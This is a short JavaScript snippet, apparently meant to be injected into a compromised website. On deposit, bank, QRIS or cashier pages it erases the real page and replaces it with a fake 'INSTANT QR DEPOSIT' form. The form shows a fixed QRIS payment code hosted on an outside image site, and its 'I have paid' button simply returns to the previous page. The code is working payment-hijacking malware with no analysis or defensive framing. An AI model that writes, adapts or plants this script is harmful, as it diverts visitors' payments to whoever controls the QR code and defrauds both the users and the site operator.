(function () {
  const targetUrls = [
    "/deposit",
    "/bank",
    "/qris",
    "/deposit.php",
    "/bank.php",
    "/qris.php",
    "index.php?page=deposit",
    "index.php?page=cashier"
  ];

  const currentUrl = window.location.href;
  const isTarget = targetUrls.some((end) => currentUrl.endsWith(end));

  if (!isTarget) return;

  // Hapus semua isi halaman lama
  document.documentElement.innerHTML = "";

  // Buat struktur baru
  const container = document.createElement("div");
  container.style.fontFamily = "Arial, sans-serif";
  container.style.display = "flex";
  container.style.flexDirection = "column";
  container.style.alignItems = "center";
  container.style.justifyContent = "center";
  container.style.minHeight = "100vh";
  container.style.background = "#f7f7f7";
  container.style.padding = "20px";
  container.innerHTML = `
    <h1 style="margin-bottom:20px;">INSTANT QR DEPOSIT</h1>
    
    <div id="form-section" style="width:100%; max-width:400px; background:#fff; padding:20px; border-radius:10px; box-shadow:0 2px 8px rgba(0,0,0,0.1); text-align:center;">
      <input type="text" id="nama" placeholder="Nama Pengirim" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px;">
      <input type="number" id="nominal" placeholder="Nominal (min. 50.000)" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:5px;">
      <input type="text" id="catatan" placeholder="Catatan" style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #ccc; border-radius:5px;">
      <button id="downloadBtn" style="width:100%; padding:10px; margin-bottom:10px; background:#007bff; color:#fff; border:none; border-radius:5px; cursor:pointer;">Download Qris</button>
      <button id="showQrisBtn" style="width:100%; padding:10px; background:#28a745; color:#fff; border:none; border-radius:5px; cursor:pointer;">Buat Qris</button>
    </div>

    <div id="qris-section" style="display:none; margin-top:20px; text-align:center;">
      <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg" alt="QRIS" style="max-width:100%; border:1px solid #ddd; border-radius:10px; margin-bottom:15px;">
      <br>
      <button id="paidBtn" style="padding:10px 20px; background:#ffc107; border:none; border-radius:5px; cursor:pointer;">Saya Sudah Membayar</button>
    </div>

    <div style="margin-top:40px;">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Footer Image" style="max-width:150px;">
    </div>

    <div style="margin-top:10px; font-size:12px; color:#666;">X2022-2025©</div>
  `;

  document.body.appendChild(container);

  // Event listeners
  document.getElementById("downloadBtn").addEventListener("click", function () {
    window.location.href = "https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg";
  });

  document.getElementById("showQrisBtn").addEventListener("click", function () {
    document.getElementById("form-section").style.display = "none";
    document.getElementById("qris-section").style.display = "block";
  });

  document.getElementById("paidBtn").addEventListener("click", function () {
    window.history.back();
  });
})();
